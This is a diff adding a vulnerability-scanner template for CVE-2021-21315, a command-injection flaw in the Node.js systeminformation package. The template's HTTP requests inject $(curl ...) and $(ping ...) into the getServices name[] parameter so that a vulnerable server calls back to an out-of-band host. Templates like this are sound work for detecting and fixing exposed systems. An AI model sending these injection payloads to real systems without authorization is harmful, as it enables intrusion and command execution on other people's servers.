@@ -1,0 +1,47 @@
+id: cve-2021-21315
+info:
+  name: Node.js Systeminformation getServices API RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An arbitrary command execution vulnerability exists in the `systeminformation` package of Node.js. An attacker can leverage this to execute system commands and gain unauthorized access.
+  tags: command-execution,rce,nodejs
+  reference:
+    - https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202102-1202
+  classification:
+    cve-id: CVE-2021-21315
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+
+variables:
+  dnslog: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /api/getServices?name=nginx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pcpu"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /api/getServices?name[]=$(curl {{dnslog}}) HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /api/getServices?name[]=$(ping {{dnslog}}) HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
